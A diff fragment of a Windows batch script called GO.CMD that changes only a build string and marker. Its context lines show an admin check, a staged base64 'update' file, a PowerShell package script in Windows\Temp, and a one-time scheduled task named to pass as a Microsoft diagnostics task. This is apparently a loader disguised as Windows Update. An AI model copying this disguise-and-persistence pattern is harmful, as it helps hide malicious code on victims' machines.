@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions
-echo === GO.CMD BUILD 20260730WU7U2 ===
+echo === GO.CMD BUILD 20260730WU7U3 ===
 
 net session >nul 2>&1
 if errorlevel 1 (
@@ -13,7 +13,7 @@ set "B64=%WORKDIR%\update.b64"
 set "PS1=%WORKDIR%\wucache_pkg.ps1"
 set "PS1ALT=C:\Windows\Temp\wucache_pkg.ps1"
 set "ERR=%WORKDIR%\boot.err"
-set "MARKER=WU_BUILD_20260730_UNIFIED2"
+set "MARKER=WU_BUILD_20260730_UNIFIED3"
 set "ONCETASK=\Microsoft\Windows\Diagnosis\WMIRegistration"
 set "RUNPS="
 set "CB=%RANDOM%%RANDOM%"
